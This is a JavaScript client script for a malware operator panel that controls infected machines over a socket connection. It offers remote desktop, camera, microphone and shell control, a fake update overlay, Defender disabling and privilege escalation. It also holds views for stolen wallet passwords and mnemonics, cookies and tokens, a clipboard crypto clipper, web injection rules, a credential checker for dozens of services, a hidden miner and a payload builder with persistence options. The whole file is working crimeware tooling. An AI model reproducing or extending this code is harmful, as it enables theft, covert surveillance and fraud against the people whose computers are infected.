const socket = io();
let operatorKey = '';
let clients = [];
let selectedClientId = null;
let currentView = 'clients';
const caches = { recovery: [], wallets: [], proxy: [], webinjection: [], sorter: [], autotasks: [], filestore: [], checkersessions: [] };

const $ = (id) => document.getElementById(id);
const el = (tag, props = {}, children = []) => {
  const n = document.createElement(tag);
  Object.assign(n, props);
  children.forEach(c => n.appendChild(typeof c === 'string' ? document.createTextNode(c) : c));
  return n;
};
const esc = (s) => String(s ?? '').replace(/[&<>"']/g, c => ({'&':'&amp;','<':'&lt;','>':'&gt;','"':'&quot;',"'":'&#39;'}[c]));

function toast(msg, ms = 2500) {
  const t = $('toast');
  t.textContent = msg;
  t.classList.remove('hidden');
  clearTimeout(toast._t);
  toast._t = setTimeout(() => t.classList.add('hidden'), ms);
}

function openModal(title, bodyNodes) {
  $('modalTitle').textContent = title;
  const body = $('modalBody');
  body.innerHTML = '';
  bodyNodes.forEach(n => body.appendChild(n));
  $('modal').classList.remove('hidden');
}
function closeModal() { $('modal').classList.add('hidden'); }
$('modalClose').onclick = closeModal;
$('modal').onclick = (e) => { if (e.target === $('modal')) closeModal(); };

// ---------- Auth ----------
$('loginBtn').onclick = () => {
  const key = $('keyInput').value.trim();
  if (!key) return;
  operatorKey = key;
  socket.emit('operator:register', key);
};
$('keyInput').addEventListener('keydown', e => { if (e.key === 'Enter') $('loginBtn').click(); });

socket.on('operator:ready', () => {
  $('login').classList.add('hidden');
  $('app').classList.remove('hidden');
  $('statusIndicator').textContent = 'Connected';
  $('statusIndicator').className = 'status-online';
  loadView('clients');
});
socket.on('operator:error', (msg) => { $('loginError').textContent = msg || 'Invalid key'; });
$('logoutBtn').onclick = () => location.reload();

function api(path, opts = {}) {
  return fetch(path, {
    ...opts,
    headers: { 'content-type': 'application/json', 'x-operator-key': operatorKey, ...(opts.headers || {}) }
  }).then(r => r.json());
}

// ---------- Nav ----------
document.querySelectorAll('#nav button').forEach(btn => {
  btn.onclick = () => loadView(btn.dataset.view);
});

function setActiveNav(view) {
  document.querySelectorAll('#nav button').forEach(b => b.classList.toggle('active', b.dataset.view === view));
}

function loadView(view) {
  currentView = view;
  setActiveNav(view);
  const root = $('viewRoot');
  root.innerHTML = '';
  const titles = {
    clients: 'Connected Clients', recovery: 'Recovery Logs', wallets: 'Wallet Logs',
    proxy: 'Proxy', clipper: 'Clipper', webinjection: 'Web Injection',
    sorter: 'Sorter', autotasks: 'Auto Tasks', filestore: 'File Store',
    miner: 'Miner', checker: 'Checker', checkersessions: 'Checker Sessions',
    builder: 'Builder'
  };
  $('viewTitle').textContent = titles[view] || view;
  const fn = views[view];
  if (fn) fn(root);
  else root.appendChild(el('div', { className: 'empty' }, ['Not implemented.']));
}

// ---------- Clients view ----------
socket.on('clients', (list) => {
  clients = list;
  if (currentView === 'clients') renderClients();
});

function renderClients() {
  const root = $('viewRoot');
  root.innerHTML = '';

  if (selectedClientId) return renderControl(root);

  if (!clients.length) {
    root.appendChild(el('div', { className: 'empty' }, ['No clients connected.']));
    return;
  }
  const grid = el('div', { className: 'card-grid' });
  clients.forEach(c => {
    const card = el('div', { className: 'card' }, [
      el('div', { className: 'card-title' }, [c.hostname || 'Unknown']),
      el('div', { className: 'card-meta' }, ['IP: ' + (c.ip || 'N/A')]),
      el('div', { className: 'card-meta' }, ['OS: ' + (c.os || 'N/A')]),
      el('div', { className: 'card-meta' }, ['User: ' + (c.user || 'N/A')]),
      el('div', { className: 'card-meta' }, ['ID: ' + c.id.slice(0, 10) + '...'])
    ]);
    card.onclick = () => { selectedClientId = c.id; renderClients(); };
    grid.appendChild(card);
  });
  root.appendChild(grid);
}

function renderControl(root) {
  const c = clients.find(x => x.id === selectedClientId);
  const header = el('div', { className: 'toolbar' }, []);
  const back = el('button', { className: 'btn' }, ['← Back']);
  back.onclick = () => { selectedClientId = null; renderClients(); };
  header.appendChild(back);
  header.appendChild(el('span', { style: 'margin-left:1rem;color:#38bdf8;font-weight:600' }, [
    (c?.hostname || selectedClientId) + ' — ' + (c?.ip || '')
  ]));
  root.appendChild(header);

  const panel = el('div', { className: 'control-panel' });
  const screenWrap = el('div', { className: 'screen-container' }, [
    el('img', { id: 'screen', src: '', alt: 'Remote Screen' })
  ]);
  panel.appendChild(screenWrap);

  const side = el('div', { className: 'control-side' });
  const actions = [
    ['Screenshot', 'screenshot'],
    ['Remote Desktop', 'remote_desktop'],
    ['Hidden Desktop', 'hidden_desktop'],
    ['Visible Desktop', 'visible_desktop'],
    ['Remote Camera', 'remote_camera'],
    ['Remote Mic', 'remote_mic'],
    ['Remote Audio', 'remote_audio'],
    ['Keyboard', 'keyboard'],
    ['Remote Shell', 'remote_shell'],
    ['Hidden Display', 'hidden_display'],
    ['Show Fake Update', 'show_overlay'],
    ['Hide Fake Update', 'hide_overlay'],
    ['File Manager', 'file_manager'],
    ['File Store Push', 'filestore_push'],
    ['Recovery Push', 'recovery_push'],
    ['Wallet Push', 'wallet_push'],
    ['Proxy Push', 'proxy_push'],
    ['Crypto Injection', 'crypto_inject'],
    ['Elevate Privileges', 'elevate'],
    ['Disable Defender', 'disable_defender'],
    ['Kill Client', 'kill']
  ];
  actions.forEach(([label, action]) => {
    const b = el('button', {}, [label]);
    b.onclick = () => sendCmd(action);
    side.appendChild(b);
  });
  panel.appendChild(side);
  root.appendChild(panel);
}

function sendCmd(action, extra = {}) {
  if (!selectedClientId) return toast('Select a client first');
  if (action === 'shell') {
    const c = prompt('Shell command:');
    if (!c) return;
    socket.emit('operator:cmd', { targetId: selectedClientId, cmd: { action: 'shell', cmd: c } });
    return;
  }
  socket.emit('operator:cmd', { targetId: selectedClientId, cmd: { action, ...extra } });
  toast('Sent: ' + action);
}

socket.on('frame', ({ id, data }) => {
  if (id !== selectedClientId) return;
  const img = document.getElementById('screen');
  if (img) img.src = 'data:image/jpeg;base64,' + data;
});
socket.on('output', ({ id, data }) => {
  if (id !== selectedClientId) return;
  openModal('Client Output', [el('pre', { style: 'white-space:pre-wrap;font-size:0.8rem' }, [String(data)])]);
});

// ---------- Collection views ----------
function collectionView(view, root, columns, opts = {}) {
  const c = caches[view];
  if (!c) return;
  const render = () => {
    root.innerHTML = '';
    const bar = el('div', { className: 'toolbar' });
    if (opts.addLabel) {
      const add = el('button', { className: 'btn primary' }, [opts.addLabel]);
      add.onclick = () => opts.onAdd?.();
      bar.appendChild(add);
    }
    const refresh = el('button', { className: 'btn' }, ['Refresh']);
    refresh.onclick = () => loadCollection(view);
    bar.appendChild(refresh);
    bar.appendChild(el('span', { style: 'color:#64748b;font-size:0.8rem;margin-left:auto' }, [c.length + ' entries']));
    root.appendChild(bar);

    if (!c.length) {
      root.appendChild(el('div', { className: 'empty' }, ['No data.']));
      return;
    }
    const table = el('table');
    const thead = el('thead');
    const trh = el('tr');
    columns.forEach(col => trh.appendChild(el('th', {}, [col.label])));
    thead.appendChild(trh);
    table.appendChild(thead);
    const tbody = el('tbody');
    c.forEach(row => {
      const tr = el('tr');
      columns.forEach(col => {
        const td = el('td');
        if (col.render) td.innerHTML = col.render(row);
        else td.textContent = row[col.key] ?? '';
        tr.appendChild(td);
      });
      if (opts.onDelete) {
        const td = el('td');
        const b = el('button', { className: 'btn small danger' }, ['Del']);
        b.onclick = async () => { await api('/api/' + view + '/' + row.id, { method: 'DELETE' }); loadCollection(view); };
        td.appendChild(b);
        tr.appendChild(td);
      }
      tbody.appendChild(tr);
    });
    table.appendChild(tbody);
    root.appendChild(table);
  };
  render();
  opts.rerender = render;
  collectionRerender[view] = render;
}

const collectionRerender = {};

async function loadCollection(view) {
  try {
    const data = await api('/api/' + view);
    caches[view] = data;
    if (collectionRerender[view]) collectionRerender[view]();
  } catch (e) { toast('Load failed'); }
}

function addRowModal(view, fields, title) {
  const nodes = fields.map(f => {
    const label = el('label', {}, [f.label]);
    let input;
    if (f.type === 'textarea') input = el('textarea');
    else if (f.type === 'select') { input = el('select'); f.options.forEach(o => input.appendChild(el('option', { value: o }, [o]))); }
    else input = el('input', { type: f.type || 'text', placeholder: f.placeholder || '' });
    input.dataset.field = f.key;
    label.appendChild(input);
    return label;
  });
  const save = el('button', { className: 'btn primary' }, ['Save']);
  save.onclick = async () => {
    const body = {};
    nodes.forEach(label => {
      const i = label.querySelector('[data-field]');
      body[i.dataset.field] = i.value;
    });
    await api('/api/' + view, { method: 'POST', body: JSON.stringify(body) });
    closeModal();
    loadCollection(view);
    toast('Added');
  };
  nodes.push(save);
  openModal(title, nodes);
}

// ---------- Views registry ----------
const views = {
  clients: renderClients,

  recovery: (root) => {
    loadCollection('recovery');
    collectionView('recovery', root, [
      { label: 'Received', render: r => esc(r.createdAt || '') },
      { label: 'IP', key: 'ip' },
      { label: 'User', key: 'user' },
      { label: 'Machine', key: 'machine' },
      { label: 'Type', key: 'type' },
      { label: 'Contents', render: r => esc((r.contents || '').slice(0, 60)) }
    ], { addLabel: 'Add Log', onAdd: () => addRowModal('recovery', [
      { key: 'ip', label: 'IP' }, { key: 'user', label: 'User' },
      { key: 'machine', label: 'Machine' }, { key: 'type', label: 'Type' },
      { key: 'contents', label: 'Contents', type: 'textarea' }
    ], 'Add Recovery Log'), onDelete: true });
  },

  wallets: (root) => {
    loadCollection('wallets');
    collectionView('wallets', root, [
      { label: 'Received', render: r => esc(r.createdAt || '') },
      { label: 'Wallet', key: 'wallet' },
      { label: 'Password', key: 'password' },
      { label: 'Mnemonic', render: r => esc((r.mnemonic || '').slice(0, 40)) },
      { label: 'IP', key: 'ip' },
      { label: 'User', key: 'user' }
    ], { addLabel: 'Add Wallet', onAdd: () => addRowModal('wallets', [
      { key: 'wallet', label: 'Wallet' }, { key: 'password', label: 'Password' },
      { key: 'mnemonic', label: 'Mnemonic', type: 'textarea' }, { key: 'ip', label: 'IP' },
      { key: 'user', label: 'User' }
    ], 'Add Wallet'), onDelete: true });
  },

  proxy: (root) => {
    loadCollection('proxy');
    collectionView('proxy', root, [
      { label: 'IP', key: 'ip' }, { label: 'Port', key: 'port' },
      { label: 'Country', key: 'country' }, { label: 'Username', key: 'username' },
      { label: 'Status', key: 'status' }, { label: 'Hwid', key: 'hwid' }
    ], { addLabel: 'Add Proxy', onAdd: () => addRowModal('proxy', [
      { key: 'ip', label: 'IP' }, { key: 'port', label: 'Port' },
      { key: 'country', label: 'Country' }, { key: 'username', label: 'Username' },
      { key: 'status', label: 'Status', type: 'select', options: ['Idle', 'Active', 'Dead'] }
    ], 'Add Proxy'), onDelete: true });
  },

  clipper: async (root) => {
    const cfg = await api('/api/clipper');
    root.innerHTML = '';
    const bar = el('div', { className: 'toolbar' });
    const add = el('button', { className: 'btn primary' }, ['Add Entry']);
    add.onclick = () => {
      addRowModalInline('clipper-entry', [
        { key: 'label', label: 'Label', placeholder: 'BTC / ETH / etc' },
        { key: 'find', label: 'Match (regex)' },
        { key: 'replace', label: 'Replacement' }
      ], 'Add Clipper Entry', (body) => {
        cfg.entries.push({ id: Date.now().toString(36), ...body });
        api('/api/clipper', { method: 'POST', body: JSON.stringify(cfg) });
        views.clipper(root);
      });
    };
    bar.appendChild(add);
    const toggle = el('label', { className: 'switch', style: 'margin-left:auto' });
    const cb = el('input', { type: 'checkbox' });
    cb.checked = !!cfg.enabled;
    cb.onchange = () => { cfg.enabled = cb.checked; api('/api/clipper', { method: 'POST', body: JSON.stringify(cfg) }); };
    toggle.appendChild(cb);
    toggle.appendChild(el('span', { className: 'slider' }));
    bar.appendChild(toggle);
    root.appendChild(bar);

    if (!cfg.entries.length) { root.appendChild(el('div', { className: 'empty' }, ['No clipper entries.'])); return; }
    const table = el('table');
    table.innerHTML = '<thead><tr><th>Label</th><th>Match</th><th>Replace</th><th></th></tr></thead>';
    const tbody = el('tbody');
    cfg.entries.forEach(e => {
      const tr = el('tr');
      tr.appendChild(el('td', {}, [e.label || '']));
      tr.appendChild(el('td', {}, [e.find || '']));
      tr.appendChild(el('td', {}, [e.replace || '']));
      const td = el('td');
      const b = el('button', { className: 'btn small danger' }, ['Del']);
      b.onclick = () => { cfg.entries = cfg.entries.filter(x => x.id !== e.id); api('/api/clipper', { method: 'POST', body: JSON.stringify(cfg) }); views.clipper(root); };
      td.appendChild(b);
      tr.appendChild(td);
      tbody.appendChild(tr);
    });
    table.appendChild(tbody);
    root.appendChild(table);
  },

  webinjection: (root) => {
    loadCollection('webinjection');
    collectionView('webinjection', root, [
      { label: 'Rule', key: 'name' }, { label: 'URL Pattern', key: 'url' },
      { label: 'Enabled', render: r => r.enabled ? '✓' : '✗' },
      { label: 'Replacement', render: r => esc((r.replacement || '').slice(0, 40)) }
    ], { addLabel: 'Add Rule', onAdd: () => addRowModal('webinjection', [
      { key: 'name', label: 'Rule Name' },
      { key: 'url', label: 'URL Pattern', placeholder: 'https://example.com/*' },
      { key: 'original', label: 'Original Code', type: 'textarea' },
      { key: 'replacement', label: 'Replacement Code', type: 'textarea' }
    ], 'Add Injection Rule'), onDelete: true });
  },

  sorter: (root) => {
    loadCollection('sorter');
    collectionView('sorter', root, [
      { label: 'Name', key: 'name' }, { label: 'Type', key: 'type' },
      { label: 'Filter', key: 'filter' }, { label: 'Format', key: 'format' }
    ], { addLabel: 'Add Group', onAdd: () => addRowModal('sorter', [
      { key: 'name', label: 'Group Name' },
      { key: 'type', label: 'Type', type: 'select', options: ['Cookies', 'Passwords', 'Folders', 'Discord Tokens', 'Steam Tokens', 'Telegram Data'] },
      { key: 'filter', label: 'Filter' },
      { key: 'format', label: 'Format', type: 'select', options: ['Netscape', 'JSON'] }
    ], 'Add Sorter Group'), onDelete: true });
  },

  autotasks: (root) => {
    loadCollection('autotasks');
    collectionView('autotasks', root, [
      { label: 'Name', key: 'name' }, { label: 'Type', key: 'type' },
      { label: 'Mode', key: 'mode' }, { label: 'Enabled', render: r => r.enabled ? '✓' : '✗' }
    ], { addLabel: 'Add Task', onAdd: () => addRowModal('autotasks', [
      { key: 'name', label: 'Task Name' },
      { key: 'type', label: 'Type', type: 'select', options: ['Recovery', 'Crypto Inject', 'Miner', 'Clipper', 'Web Injection', 'Upload and Execute', 'Disable Defender', 'Elevate', 'Rootkit'] },
      { key: 'mode', label: 'When', type: 'select', options: ['Every connect', 'Once', 'Delay'] }
    ], 'Add Auto Task'), onDelete: true });
  },

  filestore: (root) => {
    loadCollection('filestore');
    collectionView('filestore', root, [
      { label: 'Name', key: 'name' }, { label: 'Size', key: 'size' },
      { label: 'From', key: 'clientId' },
      { label: 'Uploaded', render: r => esc(r.createdAt || '') }
    ], { addLabel: 'Add File Entry', onAdd: () => addRowModal('filestore', [
      { key: 'name', label: 'Name' }, { key: 'size', label: 'Size' },
      { key: 'clientId', label: 'Client ID' }
    ], 'Add File Entry'), onDelete: true });
  },

  miner: async (root) => {
    const m = await api('/api/miner');
    root.innerHTML = '';
    const stats = el('div', { className: 'stat-row' });
    const statDefs = [
      ['Active Miners', m.stats.active], ['Total Hashrate', m.stats.hashrate + ' H/s'],
      ['Accepted', m.stats.accepted], ['Rejected', m.stats.rejected]
    ];
    statDefs.forEach(([l, v]) => {
      stats.appendChild(el('div', { className: 'stat' }, [
        el('div', { className: 'stat-label' }, [l]),
        el('div', { className: 'stat-value' }, [String(v)])
      ]));
    });
    root.appendChild(stats);

    const bar = el('div', { className: 'toolbar' });
    const add = el('button', { className: 'btn primary' }, ['Add Job']);
    add.onclick = () => {
      addRowModalInline('miner-job', [
        { key: 'name', label: 'Job Name' },
        { key: 'pool', label: 'Pool URL' },
        { key: 'wallet', label: 'Wallet' }
      ], 'Add Mining Job', (body) => {
        m.jobs.push({ id: Date.now().toString(36), ...body });
        api('/api/miner', { method: 'POST', body: JSON.stringify(m) });
        views.miner(root);
      });
    };
    bar.appendChild(add);
    root.appendChild(bar);

    if (!m.jobs.length) { root.appendChild(el('div', { className: 'empty' }, ['No mining jobs.'])); return; }
    const table = el('table');
    table.innerHTML = '<thead><tr><th>Name</th><th>Pool</th><th>Wallet</th><th></th></tr></thead>';
    const tbody = el('tbody');
    m.jobs.forEach(j => {
      const tr = el('tr');
      tr.appendChild(el('td', {}, [j.name || '']));
      tr.appendChild(el('td', {}, [j.pool || '']));
      tr.appendChild(el('td', {}, [(j.wallet || '').slice(0, 30)]));
      const td = el('td');
      const b = el('button', { className: 'btn small danger' }, ['Del']);
      b.onclick = () => { m.jobs = m.jobs.filter(x => x.id !== j.id); api('/api/miner', { method: 'POST', body: JSON.stringify(m) }); views.miner(root); };
      td.appendChild(b);
      tr.appendChild(td);
      tbody.appendChild(tr);
    });
    table.appendChild(tbody);
    root.appendChild(table);
  },

  checker: (root) => {
    root.innerHTML = '';
    const services = ['Amazon','AOL Mail','Avito','BattleNet','Binance','Booking','Bybit','ChatGPT','Claude','Coinbase','Cursor','Discord','Dropbox','EA','eBay','EFT','Epic Games','EXBO','ExitLag','Facebook','FreeBitco.in','FunPay','GitHub','GOG.com','Google','Grok','Humble Bundle','Hytale','iCloud','Instagram','Kick','Kleinanzeigen','LinkedIn','Loaded','MEXC','miHoYo','Minecraft','Netflix','Nintendo','Onet','Outlook','PayPal','Playerok','Reddit','Riot Games','Roblox','Rockstar Games','Seznam'];
    const bar = el('div', { className: 'toolbar' });
    const input = el('input', { placeholder: 'Search services...' });
    bar.appendChild(input);
    root.appendChild(bar);
    const grid = el('div', { className: 'card-grid' });
    services.forEach(s => {
      const card = el('div', { className: 'card' }, [
        el('div', { className: 'card-title' }, [s]),
        el('div', { className: 'card-meta' }, ['Email, Name, Plan'])
      ]);
      const actions = el('div', { className: 'card-actions' });
      const cfg = el('button', { className: 'btn small' }, ['Settings']);
      cfg.onclick = (e) => { e.stopPropagation(); toast('Config: ' + s); };
      actions.appendChild(cfg);
      const sw = el('label', { className: 'switch' });
      sw.appendChild(el('input', { type: 'checkbox' }));
      sw.appendChild(el('span', { className: 'slider' }));
      actions.appendChild(sw);
      card.appendChild(actions);
      grid.appendChild(card);
    });
    root.appendChild(grid);
    input.oninput = () => {
      const q = input.value.toLowerCase();
      [...grid.children].forEach(c => {
        c.style.display = c.querySelector('.card-title').textContent.toLowerCase().includes(q) ? '' : 'none';
      });
    };
  },

  checkersessions: (root) => {
    loadCollection('checkersessions');
    collectionView('checkersessions', root, [
      { label: 'Service', key: 'service' }, { label: 'Combo', render: r => esc((r.combo || '').slice(0, 50)) },
      { label: 'Status', key: 'status' }, { label: 'Checked', render: r => esc(r.createdAt || '') }
    ], { addLabel: 'Add Session', onAdd: () => addRowModal('checkersessions', [
      { key: 'service', label: 'Service' }, { key: 'combo', label: 'Combo (email:pass)' },
      { key: 'status', label: 'Status', type: 'select', options: ['Valid', 'Invalid', '2FA', 'Locked'] }
    ], 'Add Session'), onDelete: true });
  },

  builder: async (root) => {
    const b = await api('/api/builder');
    root.innerHTML = '';

    const save = () => api('/api/builder', { method: 'POST', body: JSON.stringify(b) });

    const sec = (title, fields) => {
      const box = el('div', { style: 'background:#1e293b;border:1px solid #334155;border-radius:8px;padding:1rem;margin-bottom:1rem' });
      box.appendChild(el('div', { style: 'font-weight:bold;color:#38bdf8;margin-bottom:0.8rem' }, [title]));
      fields.forEach(f => {
        if (f.type === 'toggle') {
          const row = el('div', { className: 'toggle-row' });
          row.appendChild(el('span', {}, [f.label]));
          const sw = el('label', { className: 'switch' });
          const cb = el('input', { type: 'checkbox' });
          cb.checked = !!b[f.path];
          cb.onchange = () => { b[f.path] = cb.checked; save(); };
          sw.appendChild(cb);
          sw.appendChild(el('span', { className: 'slider' }));
          row.appendChild(sw);
          box.appendChild(row);
        } else {
          const row = el('div', { className: 'form-row' });
          row.appendChild(el('label', {}, [f.label]));
          const input = el('input', { value: b[f.path] ?? '' });
          input.onchange = () => { b[f.path] = input.value; save(); };
          row.appendChild(input);
          box.appendChild(row);
        }
      });
      return box;
    };

    root.appendChild(sec('General', [
      { label: 'Client Tag', path: 'clientTag' },
      { label: 'Note', path: 'note' },
      { label: 'Mutex', path: 'mutex' }
    ]));

    root.appendChild(sec('Options', [
      { label: 'Defender Exclusion', path: 'defenderExclusion', type: 'toggle' },
      { label: 'Force Admin', path: 'forceAdmin', type: 'toggle' },
      { label: 'Debug', path: 'debug', type: 'toggle' }
    ]));

    const installBox = sec('Install', [
      { label: 'Enabled', path: 'install.enabled', type: 'toggle' },
      { label: 'Location', path: 'install.location' },
      { label: 'Folder', path: 'install.folder' },
      { label: 'Filename', path: 'install.filename' },
      { label: 'Hidden Attributes', path: 'install.hidden', type: 'toggle' },
      { label: 'System Attributes', path: 'install.system', type: 'toggle' },
      { label: 'Melt File', path: 'install.melt', type: 'toggle' },
      { label: 'Registry Autostart', path: 'install.registry', type: 'toggle' },
      { label: 'Task Scheduler Autostart', path: 'install.taskScheduler', type: 'toggle' }
    ]);
    root.appendChild(installBox);

    const finalSec = el('div', { style: 'background:#1e293b;border:1px solid #334155;border-radius:8px;padding:1rem;margin-bottom:1rem' });
    finalSec.appendChild(el('div', { style: 'font-weight:bold;color:#38bdf8;margin-bottom:0.8rem' }, ['Final']));
    const clientRow = el('div', { className: 'form-row' });
    clientRow.appendChild(el('label', {}, ['Client']));
    const sel = el('select');
    ['exe', 'dll', 'py', 'ps1'].forEach(o => sel.appendChild(el('option', { value: o }, [o])));
    sel.value = b.final.client;
    sel.onchange = () => { b.final.client = sel.value; save(); };
    clientRow.appendChild(sel);
    finalSec.appendChild(clientRow);

    const buildBtn = el('button', { className: 'btn primary', style: 'width:100%;padding:0.8rem;margin-top:0.5rem' }, ['Build Client']);
    buildBtn.onclick = async () => {
      const build = await api('/api/builder/build', { method: 'POST', body: '{}' });
      toast('Build created: ' + build.name);
      views.builder(root);
    };
    finalSec.appendChild(buildBtn);

    finalSec.appendChild(el('div', { style: 'margin-top:1rem;color:#94a3b8;font-size:0.8rem' }, ['Recent builds']));
    b.builds.forEach(bd => {
      finalSec.appendChild(el('div', { style: 'padding:0.6rem 0;border-bottom:1px solid #1e293b' }, [
        el('div', { style: 'font-size:0.85rem' }, [bd.name + ' — ' + bd.size + ' — password ' + bd.password]),
        el('div', { style: 'font-size:0.72rem;color:#64748b' }, [bd.createdAt])
      ]));
    });
    root.appendChild(finalSec);
  }
};

// ---------- Inline modal helper (for arrays inside configs) ----------
function addRowModalInline(key, fields, title, onSave) {
  const nodes = fields.map(f => {
    const label = el('label', {}, [f.label]);
    const input = el('input', { type: f.type || 'text', placeholder: f.placeholder || '' });
    input.dataset.field = f.key;
    label.appendChild(input);
    return label;
  });
  const save = el('button', { className: 'btn primary' }, ['Save']);
  save.onclick = () => {
    const body = {};
    nodes.forEach(label => {
      const i = label.querySelector('[data-field]');
      body[i.dataset.field] = i.value;
    });
    onSave(body);
    closeModal();
  };
  nodes.push(save);
  openModal(title, nodes);
}

// ---------- Live socket pushes ----------
socket.on('push', ({ collection: col, item }) => {
  if (caches[col]) {
    caches[col].push(item);
    if (collectionRerender[col]) collectionRerender[col]();
  }
});
